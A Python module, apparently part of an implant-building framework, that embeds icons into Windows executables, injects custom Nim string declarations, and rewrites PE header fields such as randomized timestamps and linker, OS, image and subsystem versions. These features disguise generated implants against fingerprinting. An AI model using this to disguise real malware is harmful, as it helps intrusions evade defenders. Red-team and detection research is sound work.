import asyncio
import os
import random
import re

import pefile

from infra.general.create_log import logger, write_log
from .paths import file, write_b64
from .build import format_build_output
from .prep import backup_before_write

windres_bins = {
    "x64": "x86_64-w64-mingw32-windres",
    "x86": "i686-w64-mingw32-windres",
}

decl_re = re.compile(
    r"^(?P<kind>var|let|const)\s+(?P<name>[A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?P<value>.+)$",
    re.IGNORECASE,
)

nim_reserved = frozenset({
    "addr", "and", "as", "asm", "bind", "block", "break", "case", "cast", "concept",
    "const", "continue", "converter", "defer", "discard", "distinct", "div", "do",
    "elif", "else", "end", "enum", "except", "export", "finally", "for", "from",
    "func", "if", "import", "include", "in", "is", "isnot", "iterator", "let",
    "macro", "method", "mixin", "mod", "nil", "not", "notin", "object", "of", "or",
    "out", "proc", "ptr", "raise", "ref", "return", "shl", "shr", "static", "template",
    "try", "type", "using", "var", "when", "while", "xor", "yield", "custom",
})


async def embed_icon(config, tag):
    # Builds an icon object for the exe
    icon_path = await write_b64(tag, config.get("exe_icon"), "icon")
    if not icon_path:
        return None

    arch = config["arch"]
    windres = windres_bins.get(arch)
    if not windres:
        return {"status": "failure", "message": f"Unsupported arch for icon embed '{arch}'"}

    rc_path = await file(tag, ".rc")
    obj_path = await file(tag, ".o")
    icon_abs = os.path.abspath(icon_path).replace("\\", "/")

    with open(rc_path, "w", encoding="utf-8") as f:
        f.write(f'1 ICON "{icon_abs}"\n')

    proc = await asyncio.create_subprocess_exec(
        windres,
        rc_path,
        "-O",
        "coff",
        "-o",
        obj_path,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    out, err = await proc.communicate()
    stdout = out.decode(errors="replace")
    stderr = err.decode(errors="replace")

    if proc.returncode:
        return {
            "status": "failure",
            "message": format_build_output(stdout, stderr, "Failed to prepare icon resource"),
            "stdout": stdout,
            "stderr": stderr,
        }

    return obj_path


def sanitize_pe_strings(raw):
    # Keeps only valid nim string declarations
    entries = []
    seen = set()
    for line in str(raw).splitlines():
        line = line.strip()
        if not line:
            continue
        match = decl_re.match(line)
        if not match:
            continue
        kind = match.group("kind").lower()
        name = match.group("name")
        value = match.group("value").strip().rstrip(";")
        if not value or name in seen or name.lower() in nim_reserved:
            continue
        seen.add(name)
        entries.append((kind, name, value))
    return entries


def write_pe_outputs(dest, entries):
    # Writes the pe strings into custom nim
    lines = [""]
    for kind, name, value in entries:
        lines.append(f"{kind} {name}* = {value}")
    lines.extend(["", "proc preface*() ="])
    for _, name, _ in entries:
        lines.append(f"  discard {name}")
    path = os.path.join(dest, "custom.nim")
    backup_before_write(path)
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")


async def create_pe_strings(config, dest):
    # Adds the custom pe strings to the source
    raw = config.get("create_pe_strings")
    if not isinstance(raw, str):
        return
    entries = sanitize_pe_strings(raw)
    if entries:
        await asyncio.to_thread(write_pe_outputs, dest, entries)


async def timestamp(config, tag, path):
    # Sets a random pe timestamp
    row = config.get("pe_timestamp")
    if not isinstance(row, dict):
        return path
    try:
        lo = int(row.get("lo", 0))
        hi = int(row.get("hi", 0))
        if lo <= 0 or hi <= 0:
            return path
        if lo > hi:
            lo, hi = hi, lo
        pe = pefile.PE(path)
        pe.FILE_HEADER.TimeDateStamp = random.randint(lo, hi)
        ext = os.path.splitext(path)[1] or ".exe"
        out = await file(tag, f".ts{ext}")
        pe.write(out)
        return out
    except Exception as e:
        write_log(logger, "error", f"Unhandled exception | implants/pe | {e}")
        return path


async def major_linker_version(config, tag, path):
    # Sets the pe major linker version
    try:
        value = int(config["pe_major_linker_version"])
        if not 0 <= value <= 255:
            return path
        pe = pefile.PE(path)
        pe.OPTIONAL_HEADER.MajorLinkerVersion = value
        ext = os.path.splitext(path)[1] or ".exe"
        out = await file(tag, f".mlv{ext}")
        pe.write(out)
        return out
    except Exception as e:
        write_log(logger, "error", f"Unhandled exception | implants/pe | {e}")
        return path


async def minor_linker_version(config, tag, path):
    # Sets the pe minor linker version
    try:
        value = int(config["pe_minor_linker_version"])
        if not 0 <= value <= 255:
            return path
        pe = pefile.PE(path)
        pe.OPTIONAL_HEADER.MinorLinkerVersion = value
        ext = os.path.splitext(path)[1] or ".exe"
        out = await file(tag, f".nlv{ext}")
        pe.write(out)
        return out
    except Exception as e:
        write_log(logger, "error", f"Unhandled exception | implants/pe | {e}")
        return path


async def major_os_version(config, tag, path):
    # Sets the pe major os version
    try:
        value = int(config["pe_major_os_version"])
        if not 0 <= value <= 65535:
            return path
        pe = pefile.PE(path)
        pe.OPTIONAL_HEADER.MajorOperatingSystemVersion = value
        ext = os.path.splitext(path)[1] or ".exe"
        out = await file(tag, f".mov{ext}")
        pe.write(out)
        return out
    except Exception as e:
        write_log(logger, "error", f"Unhandled exception | implants/pe | {e}")
        return path


async def minor_os_version(config, tag, path):
    # Sets the pe minor os version
    try:
        value = int(config["pe_minor_os_version"])
        if not 0 <= value <= 65535:
            return path
        pe = pefile.PE(path)
        pe.OPTIONAL_HEADER.MinorOperatingSystemVersion = value
        ext = os.path.splitext(path)[1] or ".exe"
        out = await file(tag, f".niv{ext}")
        pe.write(out)
        return out
    except Exception as e:
        write_log(logger, "error", f"Unhandled exception | implants/pe | {e}")
        return path


async def major_image_version(config, tag, path):
    # Sets the pe major image version
    try:
        value = int(config["pe_major_image_version"])
        if not 0 <= value <= 65535:
            return path
        pe = pefile.PE(path)
        pe.OPTIONAL_HEADER.MajorImageVersion = value
        ext = os.path.splitext(path)[1] or ".exe"
        out = await file(tag, f".miv{ext}")
        pe.write(out)
        return out
    except Exception as e:
        write_log(logger, "error", f"Unhandled exception | implants/pe | {e}")
        return path


async def minor_image_version(config, tag, path):
    # Sets the pe minor image version
    try:
        value = int(config["pe_minor_image_version"])
        if not 0 <= value <= 65535:
            return path
        pe = pefile.PE(path)
        pe.OPTIONAL_HEADER.MinorImageVersion = value
        ext = os.path.splitext(path)[1] or ".exe"
        out = await file(tag, f".niv2{ext}")
        pe.write(out)
        return out
    except Exception as e:
        write_log(logger, "error", f"Unhandled exception | implants/pe | {e}")
        return path


async def major_subsystem_version(config, tag, path):
    # Sets the pe major subsystem version
    try:
        value = int(config["pe_major_subsystem_version"])
        if not 0 <= value <= 65535:
            return path
        pe = pefile.PE(path)
        pe.OPTIONAL_HEADER.MajorSubsystemVersion = value
        ext = os.path.splitext(path)[1] or ".exe"
        out = await file(tag, f".msv{ext}")
        pe.write(out)
        return out
    except Exception as e:
        write_log(logger, "error", f"Unhandled exception | implants/pe | {e}")
        return path


async def minor_subsystem_version(config, tag, path):
    # Sets the pe minor subsystem version
    try:
        value = int(config["pe_minor_subsystem_version"])
        if not 0 <= value <= 65535:
            return path
        pe = pefile.PE(path)
        pe.OPTIONAL_HEADER.MinorSubsystemVersion = value
        ext = os.path.splitext(path)[1] or ".exe"
        out = await file(tag, f".nsv{ext}")
        pe.write(out)
        return out
    except Exception as e:
        write_log(logger, "error", f"Unhandled exception | implants/pe | {e}")
        return path
